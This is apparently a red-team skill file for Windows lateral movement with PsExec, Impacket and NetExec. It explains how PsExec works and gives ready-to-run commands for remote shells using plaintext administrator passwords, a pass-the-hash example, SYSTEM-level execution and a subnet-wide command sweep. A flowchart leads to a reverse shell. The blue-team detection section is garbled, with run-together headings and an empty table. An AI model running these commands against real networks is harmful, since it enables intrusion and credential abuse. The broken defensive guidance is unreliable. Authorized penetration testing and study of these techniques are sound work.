---
name: psexec-lateral-movement
description: >
  Execute commands and binaries on remote Windows systems utilizing PsExec and SMB/RPC 
  mechanisms. This skill details the mechanics behind tools like Sysinternals PsExec, Impacket's 
  psexec.py, and their role in lateral movement via hidden administrative shares.
domain: cybersecurity
subdomain: red-teaming
category: Lateral Movement
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0008, TA0002]
  techniques: [T1569.002, T1021.002]
platforms: [windows]
tags: [psexec, smb, lateral-movement, red-teaming, active-directory, impacket, rpc]
tools: [psexec.exe, impacket-psexec, crackmapexec]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Lateral Movement via PsExec

## When to Use
- You have compromised valid domain administrator credentials or a local administrator account for a target system.
- You need to obtain an interactive command shell (`cmd.exe` or `powershell.exe`) or execute a payload on a remote Windows machine.
- SMB (Port 445) and RPC (Port 135) are accessible.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Mechanics of PsExec

PsExec works by performing the following actions:
1. Authenticates via SMB over Port 445.
2. Connects to the `ADMIN$` hidden share (usually `C:\Windows`).
3. Uploads a service executable (e.g., `PSEXESVC.exe`).
4. Uses the Service Control Manager (SCM) via RPC to create and start a Windows service wrapping the executable.
5. Communicates input/output back via named pipes over SMB.

### Phase 2: Remote Execution with Impacket (Linux)

```bash
# # impacket-psexec Administrator:Password123!@192.168.1.100

# Using Pass-the-Hash (PTH) impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 Administrator@192.168.1.100
```

### Phase 3: Remote Execution with Sysinternals PsExec (Windows)

```cmd
# # PsExec.exe \\192.168.1.100 -u Domain\Administrator -p Password123! cmd.exe

# Execute SYSTEM shell PsExec.exe \\192.168.1.100 -s -u Domain\Administrator -p Password123! cmd.exe
```

### Phase 4: Automated Lateral Movement with CrackMapExec / NetExec

```bash
# netexec smb 192.168.1.0/24 -u Administrator -p Password123! -x "whoami"
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Check SMB Access ] --> B{Admin Privs? ]}
    B -->|Yes| C[Upload Service ]
    B -->|No| D[PsExec Fails ]
    C --> E[Reverse Shell ]
```

## 🔵 Blue Team Detection & Defense
- **Monitor EID 7045 / 4697**: **Hunting Anomalous Pipe Names**: **Disable SMBv1 and Restrict Port 445**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Psexec Lateral Movement — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Impacket Docs: [impacket-psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- Microsoft: [PsExec Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
